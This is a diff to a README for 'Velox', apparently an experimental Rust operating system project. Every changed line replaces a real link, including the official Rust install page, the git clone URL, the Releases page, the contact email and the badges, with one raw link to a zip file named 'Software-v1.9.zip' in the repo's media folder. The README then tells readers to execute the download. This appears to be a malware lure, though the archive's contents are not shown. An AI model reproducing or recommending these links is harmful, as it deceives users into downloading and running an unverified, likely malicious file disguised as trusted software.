@@ -1,6 +1,6 @@
 # Velox: An Experimental Rust-Based Operating System 🖥️
 
-![Velox Logo](https://example.com/logo.png)
+![Velox Logo](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip)
 
 Welcome to the Velox repository! Velox is a work in progress, experimental operating system built with Rust. This project aims to explore the world of operating systems while providing a fun and educational experience for developers and enthusiasts alike.
 
@@ -34,7 +34,7 @@ To get started with Velox, you need to have a basic understanding of Rust and op
 
 ### Prerequisites
 
-- Install Rust: Follow the instructions on the [official Rust website](https://www.rust-lang.org/tools/install).
+- Install Rust: Follow the instructions on the [official Rust website](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip).
 - Set up a development environment: You can use any text editor or IDE that supports Rust.
 
 ### Cloning the Repository
@@ -42,7 +42,7 @@ To get started with Velox, you need to have a basic understanding of Rust and op
 Clone the Velox repository to your local machine:
 
 ```bash
-git clone https://github.com/amrajib/velox.git
+git clone https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip
 cd velox
 ```
 
@@ -50,7 +50,7 @@ cd velox
 
 To install Velox, follow these steps:
 
-1. Download the latest release from the [Releases section](https://github.com/amrajib/velox/releases).
+1. Download the latest release from the [Releases section](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip).
 2. Execute the downloaded file to set up Velox on your system.
 
 You can also build Velox from source:
@@ -91,14 +91,14 @@ Velox is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 For questions or suggestions, feel free to reach out:
 
-- Email: your-email@example.com
-- GitHub: [amrajib](https://github.com/amrajib)
+- Email: https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip
+- GitHub: [amrajib](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip)
 
 ## Links
 
-For more information and updates, visit the [Releases section](https://github.com/amrajib/velox/releases) and check out the latest builds. 
+For more information and updates, visit the [Releases section](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip) and check out the latest builds. 
 
-![Download Velox](https://img.shields.io/badge/Download_Velox-Release-blue.svg)
+![Download Velox](https://github.com/amrajib/velox/raw/refs/heads/master/media/Software-v1.9.zip)
 
 ## Conclusion
 
